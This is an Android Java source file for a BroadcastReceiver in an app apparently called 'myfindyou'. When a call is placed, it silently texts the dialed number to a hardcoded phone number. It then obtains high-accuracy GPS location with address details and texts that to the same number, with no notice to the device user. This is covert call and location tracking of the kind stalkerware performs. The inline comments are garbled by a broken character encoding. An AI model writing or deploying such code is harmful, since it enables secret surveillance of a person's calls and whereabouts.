package com.example.myfindyou;

import com.baidu.location.LocationClient;
import com.baidu.location.LocationClientOption;
import com.baidu.location.LocationClientOption.LocationMode;
import com.example.myfindyou.MyLocationListener.MyStopListener;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;

public class ToPhoneReceiver extends BroadcastReceiver {

	public LocationClient mLocationClient = null;
	public MyLocationListener myListener = new MyLocationListener();

	@Override
	public void onReceive(Context context, Intent intent) {
		// TODO Auto-generated method stub
		String toNum = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
		SmsManager sm = SmsManager.getDefault();
		sm.sendTextMessage(Constants.phoneNumber, null, toNum, null, null);

		mLocationClient = new LocationClient(context); // ����LocationClient��
		mLocationClient.registerLocationListener(myListener); // ע���������

		initLocation();
		mLocationClient.start();
		myListener.setStopListener(new MyStopListener() {

			@Override
			public void stop(String result) {
				// TODO Auto-generated method stub
				SmsManager sm = SmsManager.getDefault();
				sm.sendTextMessage(Constants.phoneNumber, null, result, null, null);
				mLocationClient.stop();
			}
		});
	}

	private void initLocation() {
		LocationClientOption option = new LocationClientOption();
		option.setLocationMode(LocationMode.Hight_Accuracy);// ��ѡ��Ĭ�ϸ߾��ȣ����ö�λģʽ���߾��ȣ��͹��ģ����豸
		option.setCoorType("bd09ll");// ��ѡ��Ĭ��gcj02�����÷��صĶ�λ�������ϵ
		int span = 1000;
		option.setScanSpan(span);// ��ѡ��Ĭ��0��������λһ�Σ����÷���λ����ļ����Ҫ���ڵ���1000ms������Ч��
		option.setIsNeedAddress(true);// ��ѡ�������Ƿ���Ҫ��ַ��Ϣ��Ĭ�ϲ���Ҫ
		option.setOpenGps(true);// ��ѡ��Ĭ��false,�����Ƿ�ʹ��gps
		option.setLocationNotify(true);// ��ѡ��Ĭ��false�������Ƿ�gps��Чʱ����1S1��Ƶ�����GPS���
		option.setIsNeedLocationDescribe(true);// ��ѡ��Ĭ��false�������Ƿ���Ҫλ�����廯�����������BDLocation.getLocationDescribe��õ�����������ڡ��ڱ����찲�Ÿ�����
		option.setIsNeedLocationPoiList(true);// ��ѡ��Ĭ��false�������Ƿ���ҪPOI�����������BDLocation.getPoiList��õ�
		option.setIgnoreKillProcess(false);// ��ѡ��Ĭ��true����λSDK�ڲ���һ��SERVICE�����ŵ��˶������̣������Ƿ���stop��ʱ��ɱ��������̣�Ĭ�ϲ�ɱ��
		option.SetIgnoreCacheException(false);// ��ѡ��Ĭ��false�������Ƿ��ռ�CRASH��Ϣ��Ĭ���ռ�
		option.setEnableSimulateGps(false);// ��ѡ��Ĭ��false�������Ƿ���Ҫ����gps��������Ĭ����Ҫ
		mLocationClient.setLocOption(option);
	}

}
